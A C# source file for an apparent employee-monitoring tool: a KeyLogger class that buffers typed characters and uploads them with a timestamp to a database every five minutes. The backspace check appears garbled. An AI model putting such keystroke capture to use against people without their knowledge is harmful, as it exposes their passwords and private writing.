using System;
using System.Text;
using System.Timers;

namespace EmployeeActivityTracker
{
    internal class KeyLogger
    {
        private static StringBuilder pressedButtons = new StringBuilder();

        public static System.Timers.Timer timerToCleanup = new System.Timers.Timer();

        public static void LogButton(char button)
        {
            if (button == '') { pressedButtons.Append('←'); return; }
            pressedButtons.Append(button);
        }
        public static void EnableAutoLogging()
        {
            timerToCleanup.Elapsed += new ElapsedEventHandler(UploadKeyLogs);
            timerToCleanup.Interval = 300000; // (5 минут * 60 секунд * 1000 миллисекунд)
            timerToCleanup.Start();
        }
        private static void UploadKeyLogs(object source, ElapsedEventArgs e)
        {
            string timestamp = $"{DateTime.Now:dd/MM/yyyy-HH:mm}";
            SqlActions.UploadKeyLog(timestamp, string.Concat(pressedButtons));
            pressedButtons.Clear();
        }
        public static void UploadKeyLogs()
        {
            string timestamp = $"{DateTime.Now:dd/MM/yyyy-HH:mm}";
            SqlActions.UploadKeyLog(timestamp, string.Concat(pressedButtons));
            pressedButtons.Clear();
        }
    }
}
